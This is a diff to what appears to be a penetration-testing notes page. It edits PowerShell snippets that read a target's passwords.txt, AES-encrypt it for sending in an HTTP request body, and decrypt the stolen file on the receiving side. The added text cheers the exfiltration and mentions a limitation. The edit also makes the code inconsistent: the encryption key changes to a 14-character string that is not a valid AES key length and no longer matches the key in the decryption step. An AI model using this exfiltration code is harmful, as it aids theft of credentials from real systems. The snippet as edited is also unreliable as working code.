@@ -95,7 +95,7 @@ Example with AES encrypted payload:
 
 ```
 $file = Get-Content C:\Users\Target\Desktop\passwords.txt
-$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
+$key = (New-Object System.Text.ASCIIEncoding).GetBytes("UseMeToEncrypt")
 $securestring = New-Object System.Security.SecureString
 foreach ($char in $file.toCharArray()) {
       $secureString.AppendChar($char)
@@ -110,10 +110,14 @@ To decode the data on the other side simply reverse the process:
 ```
 $key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
 $encrypted = "$encrypted_payload"
-echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}
+echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}
 ```
 
 Simply substitute the `$encrypted_payload` variable with the actual content that was sent in the body of the HTTP request, and you will have your exfiltrated file!
+
+This works in either Windows Powershell, or `pwsh` on Unix systems as well. &#x20;
+
+One potential limitation I have noted is that it seems to strip out newline characters in text files. &#x20;
 
 ### Covert to and from Base64 with PowerShell
 
